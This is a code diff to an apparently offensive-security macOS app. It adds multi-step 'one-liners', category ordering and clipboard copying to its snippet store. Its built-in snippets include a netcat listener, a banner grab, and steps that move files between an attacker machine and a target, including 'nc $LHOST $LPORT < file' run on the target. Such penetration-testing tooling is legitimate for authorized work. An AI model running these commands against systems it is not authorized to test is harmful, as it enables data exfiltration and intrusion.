@@ -2,10 +2,34 @@ import AppKit
 import Foundation
 import Observation
 
+/// One step of a one-liner: a command with an optional label ("On the target", "Listener").
+struct SnippetStep: Codable, Equatable, Hashable, Identifiable {
+    var id = UUID()
+    var label: String = ""
+    var command: String
+
+    init(id: UUID = UUID(), label: String = "", command: String) {
+        self.id = id
+        self.label = label
+        self.command = command
+    }
+
+    private enum CodingKeys: String, CodingKey { case id, label, command }
+
+    init(from decoder: Decoder) throws {
+        let c = try decoder.container(keyedBy: CodingKeys.self)
+        id = try c.decodeIfPresent(UUID.self, forKey: .id) ?? UUID()
+        label = try c.decodeIfPresent(String.self, forKey: .label) ?? ""
+        command = try c.decodeIfPresent(String.self, forKey: .command) ?? ""
+    }
+}
+
+/// A one-liner: one command, or several steps that belong together (listener first, then the
+/// payload on the target, then the upgrade). Single-step one-liners keep working as before.
 struct Snippet: Identifiable, Codable, Equatable, Hashable {
     var id = UUID()
     var title: String
-    var command: String
+    var steps: [SnippetStep]
     var category: String
     /// Where the one-liner is offered in Targets: service names / port numbers ("http", "445") show
     /// it under matching ports, "port" under every port, "host" under every host. Empty = only in
@@ -15,20 +39,68 @@ struct Snippet: Identifiable, Codable, Equatable, Hashable {
     init(id: UUID = UUID(), title: String, command: String, category: String, services: [String] = []) {
         self.id = id
         self.title = title
-        self.command = command
+        self.steps = [SnippetStep(command: command)]
         self.category = category
         self.services = services
     }
 
-    private enum CodingKeys: String, CodingKey { case id, title, command, category, services }
+    init(id: UUID = UUID(), title: String, steps: [SnippetStep], category: String, services: [String] = []) {
+        self.id = id
+        self.title = title
+        self.steps = steps.isEmpty ? [SnippetStep(command: "")] : steps
+        self.category = category
+        self.services = services
+    }
+
+    private enum CodingKeys: String, CodingKey { case id, title, command, steps, category, services }
 
     init(from decoder: Decoder) throws {
         let c = try decoder.container(keyedBy: CodingKeys.self)
         id = try c.decodeIfPresent(UUID.self, forKey: .id) ?? UUID()
         title = try c.decodeIfPresent(String.self, forKey: .title) ?? ""
-        command = try c.decodeIfPresent(String.self, forKey: .command) ?? ""
+        let decodedSteps = try c.decodeIfPresent([SnippetStep].self, forKey: .steps) ?? []
+        if decodedSteps.isEmpty {
+            steps = [SnippetStep(command: try c.decodeIfPresent(String.self, forKey: .command) ?? "")]
+        } else {
+            steps = decodedSteps
+        }
         category = try c.decodeIfPresent(String.self, forKey: .category) ?? "General"
         services = try c.decodeIfPresent([String].self, forKey: .services) ?? []
+    }
+
+    /// `command` is written too, so a one-liner file still opens in older versions of Luik.
+    func encode(to encoder: Encoder) throws {
+        var c = encoder.container(keyedBy: CodingKeys.self)
+        try c.encode(id, forKey: .id)
+        try c.encode(title, forKey: .title)
+        try c.encode(command, forKey: .command)
+        try c.encode(steps, forKey: .steps)
+        try c.encode(category, forKey: .category)
+        try c.encode(services, forKey: .services)
+    }
+
+    /// The first (or only) command.
+    var command: String {
+        get { steps.first?.command ?? "" }
+        set {
+            if steps.isEmpty {
+                steps = [SnippetStep(command: newValue)]
+            } else {
+                steps[0].command = newValue
+            }
+        }
+    }
+
+    var isMultiStep: Bool { steps.count > 1 }
+
+    /// All commands, one per line (unresolved).
+    var allCommands: String {
+        steps.map { $0.command }.joined(separator: "\n")
+    }
+
+    /// Everything a search may hit.
+    var searchText: String {
+        ([title, category] + steps.flatMap { [$0.label, $0.command] }).joined(separator: " ")
     }
 
     var servicesText: String { services.joined(separator: ", ") }
@@ -71,6 +143,8 @@ final class SnippetStore {
     var lhost: String = ""      // $LHOST — your own (VPN) address
     var lport: String = ""      // $LPORT
     var rport: String = ""      // $RPORT (in Targets the selected port is used instead)
+    /// Display order of the categories (Settings); categories not listed follow in order of appearance.
+    var categoryOrder: [String] = []
     @ObservationIgnored private var saver = Debouncer()
 
     init() {
@@ -80,6 +154,7 @@ final class SnippetStore {
         lhost = defaults.string(forKey: SettingsKey.snippetLHost) ?? ""
         lport = defaults.string(forKey: SettingsKey.snippetLPort) ?? ""
         rport = defaults.string(forKey: SettingsKey.snippetRPort) ?? ""
+        categoryOrder = defaults.stringArray(forKey: SettingsKey.snippetCategoryOrder) ?? []
         if lhost.isEmpty, let suggested = LocalAddress.suggested() {
             lhost = suggested.address
         }
@@ -196,20 +271,100 @@ final class SnippetStore {
     var filtered: [Snippet] {
         let query = search.trimmingCharacters(in: .whitespacesAndNewlines).lowercased()
         guard !query.isEmpty else { return snippets }
-        return snippets.filter {
-            $0.title.lowercased().contains(query)
-                || $0.command.lowercased().contains(query)
-                || $0.category.lowercased().contains(query)
-        }
+        return snippets.filter { $0.searchText.lowercased().contains(query) }
     }
 
-    /// Categories in order of first appearance.
+    /// Categories of the filtered list, in the order of `categoryOrder` (then first appearance).
     var filteredCategories: [String] {
         var seen: [String] = []
         for snippet in filtered where !seen.contains(snippet.category) {
             seen.append(snippet.category)
         }
-        return seen
+        return SnippetStore.sorted(categories: seen, by: categoryOrder)
+    }
+
+    /// Every category, in display order.
+    var allCategories: [String] {
+        var seen: [String] = []
+        for snippet in snippets where !seen.contains(snippet.category) {
+            seen.append(snippet.category)
+        }
+        return SnippetStore.sorted(categories: seen, by: categoryOrder)
+    }
+
+    private static func sorted(categories: [String], by order: [String]) -> [String] {
+        categories.enumerated().sorted { a, b in
+            let ia = order.firstIndex(of: a.element) ?? Int.max
+            let ib = order.firstIndex(of: b.element) ?? Int.max
+            if ia != ib { return ia < ib }
+            return a.offset < b.offset
+        }.map { $0.element }
+    }
+
+    // MARK: - Ordering
+
+    /// List-style move: `destination` is counted before the moved rows are taken out.
+    static func reorder<T>(_ items: inout [T], from source: IndexSet, to destination: Int) {
+        let moving = source.sorted().compactMap { $0 < items.count ? items[$0] : nil }
+        var remaining: [T] = []
+        for (offset, element) in items.enumerated() where !source.contains(offset) {
+            remaining.append(element)
+        }
+        let before = source.filter { $0 < destination }.count
+        let insertAt = min(max(destination - before, 0), remaining.count)
+        remaining.insert(contentsOf: moving, at: insertAt)
+        items = remaining
+    }
+
+    /// Drag in the list: `source`/`destination` are positions within the category's own rows.
+    func move(inCategory category: String, from source: IndexSet, to destination: Int) {
+        var items = snippets.filter { $0.category == category }
+        SnippetStore.reorder(&items, from: source, to: destination)
+        var iterator = items.makeIterator()
+        for index in snippets.indices where snippets[index].category == category {
+            if let next = iterator.next() { snippets[index] = next }
+        }
+        scheduleSave()
+    }
+
+    enum MoveDirection {
+        case up, down, top, bottom
+    }
+
+    /// Context menu: one row up or down within its category, or to the top / bottom.
+    func move(_ id: UUID, _ direction: MoveDirection) {
+        guard let snippet = snippets.first(where: { $0.id == id }) else { return }
+        let members = snippets.filter { $0.category == snippet.category }
+        guard let position = members.firstIndex(where: { $0.id == id }) else { return }
+        // `toOffset` counts positions before the row is taken out (Array.move semantics).
+        let target: Int
+        switch direction {
+        case .up: target = max(position - 1, 0)
+        case .down: target = min(position + 2, members.count)
+        case .top: target = 0
+        case .bottom: target = members.count
+        }
+        move(inCategory: snippet.category, from: IndexSet(integer: position), to: target)
+    }
+
+    func moveCategory(_ category: String, up: Bool) {
+        var order = allCategories
+        guard let index = order.firstIndex(of: category) else { return }
+        let target = up ? index - 1 : index + 1
+        guard target >= 0, target < order.count else { return }
+        order.swapAt(index, target)
+        categoryOrder = order
+        UserDefaults.standard.set(order, forKey: SettingsKey.snippetCategoryOrder)
+    }
+
+    func duplicate(_ id: UUID) {
+        guard let index = snippets.firstIndex(where: { $0.id == id }) else { return }
+        var copy = snippets[index]
+        copy.id = UUID()
+        copy.title += " (copy)"
+        copy.steps = copy.steps.map { SnippetStep(label: $0.label, command: $0.command) }
+        snippets.insert(copy, at: index + 1)
+        scheduleSave()
     }
 
     /// `$RHOST` / `${RHOST}` (whole name, so not `$RHOSTS`) plus the legacy placeholders.
@@ -274,10 +429,15 @@ final class SnippetStore {
         return "export " + parts.joined(separator: " ")
     }
 
+    /// All steps of a one-liner, resolved, one per line.
     func copyToClipboard(_ snippet: Snippet) {
+        copyToClipboard(text: snippet.steps.map { resolve($0.command) }.joined(separator: "\n"))
+    }
+
+    func copyToClipboard(text: String) {
         let pasteboard = NSPasteboard.general
         pasteboard.clearContents()
-        pasteboard.setString(resolve(snippet.command), forType: .string)
+        pasteboard.setString(text, forType: .string)
     }
 
     func upsert(_ snippet: Snippet) {
@@ -352,10 +512,15 @@ final class SnippetStore {
         Snippet(title: "Banner grab", command: "nc -nv $RHOST $RPORT", category: "Services", services: ["port"]),
 
         // Utilities
-        Snippet(title: "Simple HTTP server (share files)", command: "python3 -m http.server 8000", category: "Utilities"),
-        Snippet(title: "Fetch a file from your machine (run on the target)", command: "curl -O http://$LHOST:8000/file", category: "Utilities"),
+        Snippet(title: "Transfer a file to the target (HTTP)", steps: [
+            SnippetStep(label: "On your machine, in the folder with the file", command: "python3 -m http.server 8000"),
+            SnippetStep(label: "On the target", command: "curl -O http://$LHOST:8000/file"),
+        ], category: "Utilities"),
         Snippet(title: "Netcat listener", command: "nc -lvnp $LPORT", category: "Utilities"),
-        Snippet(title: "Receive a file with netcat", command: "nc -lvnp $LPORT > received.bin", category: "Utilities"),
+        Snippet(title: "Receive a file with netcat", steps: [
+            SnippetStep(label: "On your machine", command: "nc -lvnp $LPORT > received.bin"),
+            SnippetStep(label: "On the target", command: "nc $LHOST $LPORT < file"),
+        ], category: "Utilities"),
         Snippet(title: "SSH: local port forward", command: "ssh -L 8080:127.0.0.1:80 user@$RHOST", category: "Utilities", services: ["ssh", "22"]),
         Snippet(title: "tcpdump to pcap", command: "sudo tcpdump -i en0 host $RHOST -w scans/capture.pcap", category: "Utilities", services: ["host"]),
         Snippet(title: "searchsploit", command: "searchsploit <service>", category: "Utilities"),
